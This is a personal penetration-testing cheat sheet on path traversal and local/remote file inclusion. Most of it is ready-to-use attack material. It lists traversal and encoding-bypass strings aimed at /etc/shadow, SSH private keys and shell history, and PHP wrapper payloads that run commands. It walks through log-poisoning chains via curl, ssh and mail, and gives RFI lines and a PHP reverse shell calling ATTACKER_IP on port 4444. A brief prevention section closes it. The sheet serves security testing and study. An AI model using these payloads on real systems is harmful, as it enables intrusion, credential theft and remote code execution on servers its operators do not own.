# file-traversal-lfi-rfi

**Author:** Julien Bongars\
**Date:** 2025-09-26 21:58:30
**Path:**

---

Path traversal and local/remote file inclusion: payloads, PHP wrappers, and log-poisoning chains.

## Basic path traversal patterns

### Linux

```txt
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

### Windows

```txt
..\..\..\windows\system32\drivers\etc\hosts
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

## Common target files

### Linux configuration files

```txt
/etc/passwd          # User accounts
/etc/shadow          # Password hashes (requires root)
/etc/group           # Groups
/etc/hosts           # Host mappings
/etc/fstab           # File systems
/etc/crontab         # Scheduled tasks
/proc/version        # Kernel version
/proc/cmdline        # Boot parameters
/proc/mounts         # Mounted filesystems
/proc/net/tcp        # Network connections
/proc/net/fib_trie   # Network routing
```

### Web server files

```txt
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/var/www/html/index.php
```

### Application configuration

```txt
/etc/mysql/my.cnf
/etc/postgresql/postgresql.conf
/etc/ssh/sshd_config
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
```

## PHP wrappers

### php://filter (source code disclosure)

```txt
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php
php://filter/read=convert.quoted-printable-encode/resource=index.php
```

### php://input (POST data execution)

```txt
POST request to: ?file=php://input
POST body: <?php system($_GET['cmd']); ?>
Then: ?file=php://input&cmd=id
```

### data:// (direct code execution)

```txt
data://text/plain,<?php system($_GET['cmd']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### expect:// (command execution)

```txt
expect://id
expect://whoami
expect://cat /etc/passwd
```

## Log poisoning

### Apache access log

1. **Inject payload via User-Agent:**

   ```bash
   curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
   ```

2. **Access log via LFI:**

   ```txt
   ?file=../../../var/log/apache2/access.log&cmd=id
   ```

### SSH log

1. **Inject via SSH username:**

   ```bash
   ssh '<?php system($_GET["cmd"]); ?>'@target-ip
   ```

2. **Access auth log:**

   ```txt
   ?file=../../../var/log/auth.log&cmd=whoami
   ```

### Mail log

1. **Send mail with PHP payload:**

   ```bash
   mail -s "<?php system(\$_GET['cmd']); ?>" user@localhost < /dev/null
   ```

2. **Access mail log:**

   ```txt
   ?file=../../../var/log/mail.log&cmd=id
   ```

## Remote file inclusion (RFI)

### Test for RFI support

```txt
?file=http://attacker-server/test.txt
?file=ftp://attacker-server/test.txt
?file=\\attacker-server\share\test.txt  # Windows SMB
```

### Attack server

```bash
# Python HTTP server
python3 -m http.server 8080

# PHP built-in server
php -S 0.0.0.0:8080

# FTP server (Python)
python3 -m pyftpdlib -p 21 -w
```

### Reverse shell payloads

**PHP reverse shell:**

```php
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
exec("/bin/bash -i <&3 >&3 2>&3", $sock);
?>
```

**One-liner PHP shell:**

```php
<?php system($_GET['cmd']); ?>
```

## Bypass techniques

### Null byte injection (PHP < 5.3.4)

```txt
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.jpg
```

### Double encoding

```txt
%252e%252e%252f  # ../
%252e%252e%255c  # ..\
```

### Unicode bypass

```txt
..%c0%af
..%c1%9c
```

### Filter bypass

```txt
....//
...\\/
....\\
```

## Detection and enumeration

### Check for LFI

```bash
# Basic test
curl "http://target/?file=../../../etc/passwd"

# Automated scanning
ffuf -u "http://target/FUZZ" -w /path/to/lfi-wordlist.txt

# Burp Suite Intruder payloads
wfuzz -u "http://target/?file=FUZZ" -w lfi-payloads.txt
```

### Identify OS and services

```txt
# Linux detection
?file=../../../etc/passwd
?file=../../../proc/version

# Windows detection
?file=..\..\..\..\windows\system32\drivers\etc\hosts
?file=C:\windows\system32\drivers\etc\hosts

# Web server detection
?file=../../../var/log/apache2/access.log
?file=../../../var/log/nginx/access.log
```

## Prevention

### Secure coding

```php
// Input validation
$allowed_files = ['page1.php', 'page2.php', 'page3.php'];
$file = $_GET['file'];
if (in_array($file, $allowed_files)) {
    include $file;
}

// Use basename() to prevent directory traversal
$file = basename($_GET['file']);
include "/var/www/pages/" . $file;

// Whitelist approach with realpath()
$file = realpath("/var/www/pages/" . $_GET['file']);
if (strpos($file, '/var/www/pages/') === 0) {
    include $file;
}
```

### Server configuration

- Disable dangerous PHP functions: `allow_url_include`, `allow_url_fopen`
- Use `open_basedir` restriction
- Implement proper file permissions
- Enable logging and monitoring
- Use Web Application Firewall (WAF)

## Common LFI to RCE chains

1. **LFI → Log Poisoning → RCE**
2. **LFI → Session File Poisoning → RCE**
3. **LFI → Mail Log Poisoning → RCE**
4. **LFI → PHP Wrapper → RCE**
5. **LFI → RFI → RCE**

## Tools

- **ffuf** - Fast web fuzzer
- **Burp Suite** - Web application testing
- **wfuzz** - Web application bruteforcer
- **LFISuite** - Automated LFI exploitation
- **fimap** - File inclusion mapper
- **Kadimus** - LFI exploitation tool

## Resources

- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) — wrappers, poisoning, RFI
- [HackTricks — File inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) — LFI/RFI techniques
